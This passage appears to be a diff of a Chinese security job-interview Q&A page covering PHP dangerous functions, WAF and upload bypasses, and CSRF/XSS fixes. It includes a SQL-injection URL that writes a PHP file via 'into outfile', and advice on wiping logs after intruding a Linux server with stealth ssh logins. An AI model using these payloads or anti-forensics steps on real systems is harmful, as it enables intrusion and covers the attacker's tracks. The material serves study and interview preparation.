+<h3 id="php中命令执行涉及到的函数">php中命令执行涉及到的函数</h3>
+<p>eval()、assert()、popen()、system()、exec()、shell_exec()、passthru()、pcntl_exec()等函数</p>
+<h3 id="宽字节注入产生原理以及根本原因">宽字节注入产生原理以及根本原因</h3>
+<p>在PHP中比如addslash和magic_quotes_gpc开启</p>
+<h3 id="如何防止-csrf">如何防止 CSRF?</h3>
+<p>验证Referer 添加token</p>
+<h3 id="代码执行文件读取命令执行的函数都有哪些">代码执行，文件读取，命令执行的函数都有哪些？</h3>
+<p>1，代码执行：
+eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()
+2，文件读取： file_get_contents(),highlight_file(),fopen(),read
+file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
+3，命令执行： system(), exec(), shell_exec(), passthru() ,pcntl_exec(),
+popen(),proc_open()</p>
+<h3 id="img-标签除了-onerror-属性外还有其他获取管理员路径的办法吗">img
+标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h3>
+<p>src指定一个远程的脚本文件，获取referer</p>
+<h3 id="img-标签除了-onerror-属性外并且-src-属性的后缀名必须以.jpg-结尾怎么获取管理员路径">img
+标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg
+结尾，怎么获取管理员路径。</h3>
+<p>远程服务器修改apache配置文件
+配置.jpg文件以php方式来解析<code>AddType application/x-httpd-php .jpg</code>
+<code>&lt;img src=http://xss.tv/1.jpg&gt;</code> 会以php方式来解析</p>
+<h3 id="为什么-aspx-木马权限比-asp-大">为什么 aspx 木马权限比 asp
+大？</h3>
+<p>aspx使用的是.net技术。 IIS 中默认不支持，ASP只是脚本语言而已。
+入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
+<h3 id="如何绕过-waf">如何绕过 waf？</h3>
+<p>大小写 内敛注释 换行符 编码 参数污染</p>
+<h3 id="文件上传有哪些防护方式">文件上传有哪些防护方式</h3>
+<p>文件上传的目录设置为不可执行 白名单机制 重命名 使用安全设备防御</p>
+<h3 id="注入有防护怎么办">注入有防护怎么办</h3>
+<p>绕waf</p>
+<h3 id="ddos-如何防护">ddos 如何防护</h3>
+<p>SYN cookie(为每个ip分配一个"cookie") 统计ip访问频率 banip
+使用安全设备</p>
+<h3 id="为什么参数化查询可以防止-sql-注入">为什么参数化查询可以防止 sql
+注入</h3>
+<p>参数化查询可以对参数进行过滤，还能够重用执行计划，若执行计划被重用的话，SQL所要表达的语义是不会变化的
+之前学javaweb时候用过预处理的方法 把变量用?代替 然后再去写那个函数</p>
+<h3 id="sql-如何写-shell单引号被过滤怎么办">sql 如何写
+shell/单引号被过滤怎么办</h3>
+<p>&lt;1&gt; 写shell(root权限，GPC关闭，知道文件路径，outfile函数)
+<code>http://127.0.0.1:81/sqli.php?id=1 into outfile 'C:\\wamp64\\www\\phpinfo.php' FIELDS TERMINATED BY ''</code>
+<code>http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile 'C:\\wamp64\\www\\phpinfo.php'</code>
+&lt;2&gt; 宽字节注入</p>
+<h3 id="对于-xss-怎么修补建议">对于 XSS 怎么修补建议</h3>
+<p>输入编码转义(可以用html实体编码) 白名单过滤(过滤一些标签和js事件)
+httponly</p>
+<h3 id="添加-token和-referer-做横向对比谁安全等级高">添加 token和
+referer 做横向对比，谁安全等级高？</h3>
+<p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。
+并且FLASH一些版本中可以自定义referer。
+但是token的话，要保证其足够随机且不可泄露</p>
+<h3 id="常见的上传绕过方式">常见的上传绕过方式</h3>
+<p>前端js验证 bp抓包改包 大小写、双写 00截断 %00 0x00 mime类型绕过
+改Content-Type</p>
+<h3 id="导致文件包含的函数">导致文件包含的函数</h3>
+<p><code>PHP: include(), include_once(), require(),require_once</code>
+可参考 https://err0rzz.github.io/2017/08/31/file_include/</p>
+<h3 id="入侵-linux-服务器后需要清除哪些日志">入侵 Linux
+服务器后需要清除哪些日志？</h3>
+<p>history vim ~/.bash_history 系统日志<br>
+web日志 删除指定ip 时间点 ssh登录记录
+隐身登录系统，不会被w、who、last等指令检测到(<code>ssh -T root@192.168.0.1 /bin/bash -i</code>)
+不记录ssh公钥在本地.ssh目录中(<code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code>)</p>
+<h3 id="如何加固一个域环境下的-windows-桌面工作环境请给出你的思路">如何加固一个域环境下的
+Windows 桌面工作环境？请给出你的思路。</h3>
+<p>&lt;1&gt; 修补补丁，及时备份 &lt;2&gt; 排查弱口令和账号 &lt;3&gt;
+开启服务与端口配置 关闭不必要的端口和服务 &lt;4&gt; 日志配置与审核
+增加日志大小以保证完整 对系统事件审核 &lt;5&gt; 系统安全设置
+设置屏保和远程连接挂起时间，禁止系统自动登录 &lt;6&gt; 授权
+只允许管理员组用户远程开机关机 只有授权用户才可远程登录或本地登录
+&lt;7&gt; 文件系统权限 删除everyone权限或取消everyone的写权限
+限制部分系统命令的访问权限</p>
+<h3 id="宝塔禁止php函数如何绕过">宝塔禁止PHP函数如何绕过？</h3>
+<p>蚁剑disable_function插件</p>
+<h3 id="fastjson不出网如何利用">fastjson不出网如何利用？</h3>
+<p>dnslog回显</p>
+<h3 id="域内的一个普通用户非域用户如何进行利用">域内的一个普通用户（非域用户）如何进行利用？</h3>
+<p>域内提权？？CVE 2021-42287 / CVE 2021-42278</p>
+<h3 id="go语言免杀shellcode如何免杀免杀原理是什么">go语言免杀shellcode如何免杀？免杀原理是什么？</h3>
+<h3 id="windows-defender防御机制原理如何绕过">windows
+defender防御机制原理，如何绕过？</h3>
+<h3 id="卡巴斯基进程保护如何绕过进行进程迁移">卡巴斯基进程保护如何绕过进行进程迁移？</h3>
+<h3 id="工作组环境下如何进行渗透">工作组环境下如何进行渗透？</h3>
+<h3 id="内存马的机制">内存马的机制？</h3>
+<h3 id="说出印象比较深刻的一次外网打点进入内网">说出印象比较深刻的一次外网打点进入内网？</h3>
+<h3 id="证书透明度的危害">证书透明度的危害？</h3>
+
     </div>
 
     
@@ -503,7 +779,27 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">应急响应基本思路流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">Windows入侵排查思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E-amp-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="nav-number">3.</span> <span class="nav-text">框架漏洞&amp;常见命令注入漏洞？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E3%80%81%E8%AE%BE%E5%A4%87"><span class="nav-number">4.</span> <span class="nav-text">常见安全工具、设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDOS-CC%E5%BA%94%E6%80%A5%E6%80%9D%E8%B7%AF%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="nav-number">5.</span> <span class="nav-text">DDOS CC应急思路以及如何防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8webshell%EF%BC%8C%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%EF%BC%9F"><span class="nav-number">6.</span> <span class="nav-text">服务器存在webshell，如何处理？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5shell-%E5%BA%94%E8%AF%A5%E7%94%A8%E4%BB%80%E4%B9%88%E5%91%BD%E4%BB%A4%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%8E%92%E6%9F%A5"><span class="nav-number">7.</span> <span class="nav-text">排查shell 应该用什么命令来进行排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8Bwebshell"><span class="nav-number">8.</span> <span class="nav-text">如何检测webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="nav-number">9.</span> <span class="nav-text">Webshell管理工具的流量特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.</span> <span class="nav-text">常见端口漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%A4%E6%96%AD-amp-%E6%8C%96%E7%9F%BF%E5%B8%B8%E8%A7%81%E6%89%8B%E6%AE%B5-amp-%E5%A4%84%E7%90%86"><span class="nav-number">11.</span> <span class="nav-text">挖矿病毒判断&amp;挖矿常见手段&amp;处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E6%88%96%E8%80%85%E6%97%A5%E5%BF%97%EF%BC%8C%E4%BD%A0%E7%9A%84%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">12.</span> <span class="nav-text">数据包或者日志，你的分析思路是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%9C%89%E7%9C%8B%E8%BF%87%E7%9B%B8%E5%85%B3%E6%97%A5%E5%BF%97%E5%90%97"><span class="nav-number">13.</span> <span class="nav-text">文件上传和命令执行，有看过相关日志吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="nav-number">14.</span> <span class="nav-text">windows日志分析工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7%E5%91%BD%E4%BB%A4"><span class="nav-number">15.</span> <span class="nav-text">Linux日志分析技巧命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84%E6%97%A5%E5%BF%97%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90"><span class="nav-number">16.</span> <span class="nav-text">给你一个比较大的日志，应该如何分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E5%9C%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E5%9C%BA%E6%99%AF"><span class="nav-number">17.</span> <span class="nav-text">Windows在应急响应中的安全日志以及对应场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E8%AF%AF%E6%8A%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="nav-number">18.</span> <span class="nav-text">设备误报如何处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E5%92%8CLinux%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="nav-number">19.</span> <span class="nav-text">Windows和Linux的日志文件放在哪里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98shell"><span class="nav-number">20.</span> <span class="nav-text">如何查看系统内存shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5"><span class="nav-number">21.</span> <span class="nav-text">Java 内存马排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9WEB%E7%AB%AF%E5%8F%A3%EF%BC%9F%E5%A6%82%E6%9E%9C%E4%B8%8D%E8%83%BD%E4%BF%AE%E6%94%B9%E7%AB%AF%E5%8F%A3%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="nav-number">22.</span> <span class="nav-text">如何修改WEB端口？如果不能修改端口还有什么利用方法？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%8C%E9%80%9A%E5%B8%B8%E4%BC%9A%E8%AF%BB%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6%EF%BC%8CLinux%E5%92%8Cwindows%E9%83%BD%E8%B0%88%E8%B0%88"><span class="nav-number">23.</span> <span class="nav-text">获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B%E9%97%B4%E8%BD%AC%E6%8D%A2"><span class="nav-number">24.</span> <span class="nav-text">windows端口进程间转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB%E7%89%B9%E5%BE%81%EF%BC%9F"><span class="nav-number">25.</span> <span class="nav-text">文件上传攻击特征？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="nav-number">26.</span> <span class="nav-text">文件上传加固方法？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E8%BF%98%E7%94%A8%E8%BF%87%E5%85%B6%E4%BB%96%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E7%9A%84%E4%BA%A7%E5%93%81%E5%90%97%EF%BC%9F"><span class="nav-number">27.</span> <span class="nav-text">你还用过其他态势感知的产品吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E5%A4%84%E7%BD%AE"><span class="nav-number">28.</span> <span class="nav-text">钓鱼邮件处置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%8C%BA%E5%88%86%E6%98%AF%E6%89%AB%E6%8F%8F%E6%B5%81%E9%87%8F%E5%92%8C%E6%89%8B%E5%8A%A8%E6%B5%81%E9%87%8F"><span class="nav-number">29.</span> <span class="nav-text">如何查看区分是扫描流量和手动流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%B8%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-amp-%E9%98%B2%E5%BE%A1"><span class="nav-number">30.</span> <span class="nav-text">️入侵检测&amp;防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E4%BA%A7%E5%93%81%E5%A6%82%E4%BD%95%E6%9D%A5%E6%8B%A6%E6%88%AA%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="nav-number">31.</span> <span class="nav-text">WAF产品如何来拦截攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="nav-number">32.</span> <span class="nav-text">WAF有哪些防护方式？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%81%9A%E5%89%8D%E7%BD%AE%E8%A7%84%E9%81%BF%EF%BC%9F"><span class="nav-number">33.</span> <span class="nav-text">不安全的第三方组件的漏洞如何做前置规避？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E7%8E%B0%E5%9C%A8%E8%A6%81%E4%BD%A0%E5%86%99%E4%B8%80%E4%B8%AA%E6%A3%80%E6%B5%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%9F"><span class="nav-number">34.</span> <span class="nav-text">如果现在要你写一个检测命令注入的脚本？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%B8%8F%E6%BA%AF%E6%BA%90%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">35.</span> <span class="nav-text">️溯源基本步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB"><span class="nav-number">36.</span> <span class="nav-text">黄金票据和白银票据的一些区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">37.</span> <span class="nav-text">序列化与反序列化的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="nav-number">38.</span> <span class="nav-text">常见的中间件漏洞？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91-%E8%8F%9C%E5%88%80-C-%E5%88%80-%E5%86%B0%E8%9D%8E%E7%9A%84%E7%9B%B8%E5%90%8C%E4%B8%8E%E4%B8%8D%E7%9B%B8%E5%90%8C%E4%B9%8B%E5%A4%84"><span class="nav-number">39.</span> <span class="nav-text">蚁剑&#x2F;菜刀&#x2F;C 刀&#x2F;冰蝎的相同与不相同之处</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91-SHELL-%E5%92%8C%E5%8F%8D%E5%90%91-SHELL-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">40.</span> <span class="nav-text">正向 SHELL 和反向 SHELL 的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="nav-number">41.</span> <span class="nav-text">Windows 常用的提权方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="nav-number">42.</span> <span class="nav-text">Linux 提权有哪些方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">43.</span> <span class="nav-text">PHP 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BD%95%E4%B8%80%E4%B8%AA-MYSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%AB%99%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA-80-%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="nav-number">44.</span> <span class="nav-text">为何一个 MYSQL 数据库的站，只有一个 80 端口开放？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E6%88%90%E7%86%9F%E5%B9%B6%E4%B8%94%E7%9B%B8%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84-CMS%EF%BC%8C%E6%B8%97%E9%80%8F%E6%97%B6%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="nav-number">45.</span> <span class="nav-text">一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%9F%90%E5%90%8E%E5%8F%B0%E6%96%B0%E9%97%BB%E7%BC%96%E8%BE%91%E7%95%8C%E9%9D%A2%E7%9C%8B%E5%88%B0%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">46.</span> <span class="nav-text">在某后台新闻编辑界面看到编辑器，应该先做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E6%9F%A5%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E5%85%83%E7%B4%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="nav-number">47.</span> <span class="nav-text">审查上传点的元素有什么意义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-%E5%92%8C-XSS-%E5%92%8C-XXE-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="nav-number">48.</span> <span class="nav-text">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3389-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">49.</span> <span class="nav-text">3389 无法连接的几种情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E7%AB%99%E6%97%A0%E9%98%B2%E6%8A%A4%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F%E8%AE%BF%E9%97%AE%E5%88%99-403%EF%BC%8C%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0%EF%BC%9F"><span class="nav-number">50.</span> <span class="nav-text">目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E7%AB%99%E7%A6%81%E6%AD%A2%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%EF%BC%8C%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%A4%84%E9%9A%8F%E4%BE%BF%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E6%8F%90%E7%A4%BA%EF%BC%9A%E2%80%9C%E6%AD%A4%E7%94%A8%E6%88%B7%E4%B8%8D%E5%AD%98%E5%9C%A8%E2%80%9D%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E8%BF%99%E9%87%8C%E6%80%8E%E6%A0%B7%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="nav-number">51.</span> <span class="nav-text">目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89%EF%BC%9F"><span class="nav-number">52.</span> <span class="nav-text">如何突破注入时字符被转义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA-webshell-%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%9C%89-htaccess-%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">53.</span> <span class="nav-text">拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%8B%97%E4%BC%9A%E8%BF%BD%E8%B8%AA%E5%8F%98%E9%87%8F%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%8F%91%E7%8E%B0%E5%87%BA%E6%98%AF%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%90%97%EF%BC%9F"><span class="nav-number">54.</span> <span class="nav-text">安全狗会追踪变量，从而发现出是一句话木马吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%97%B6%E9%80%89%E6%8B%A9%E5%8F%AF%E8%AF%BB%E5%86%99%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%B8%BA%E4%BD%95%E5%B0%BD%E9%87%8F%E4%B8%8D%E7%94%A8%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%9F"><span class="nav-number">55.</span> <span class="nav-text">提权时选择可读写目录，为何尽量不用带空格的目录？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E9%98%B2%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E6%8B%BF-shell%EF%BC%9F"><span class="nav-number">56.</span> <span class="nav-text">如何利用这个防注入系统拿 shell？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E3%80%81SSRF-%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="nav-number">57.</span> <span class="nav-text">CSRF、SSRF 和重放攻击有什么区别？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">58.</span> <span class="nav-text">nmap扫描的几种方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="nav-number">59.</span> <span class="nav-text">报错注入的函数有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E6%9D%A5%E5%88%A4%E6%96%AD%EF%BC%9F"><span class="nav-number">60.</span> <span class="nav-text">延时注入如何来判断？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="nav-number">61.</span> <span class="nav-text">sql 注入写文件都有哪些函数？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">62.</span> <span class="nav-text">php中命令执行涉及到的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="nav-number">63.</span> <span class="nav-text">宽字节注入产生原理以及根本原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 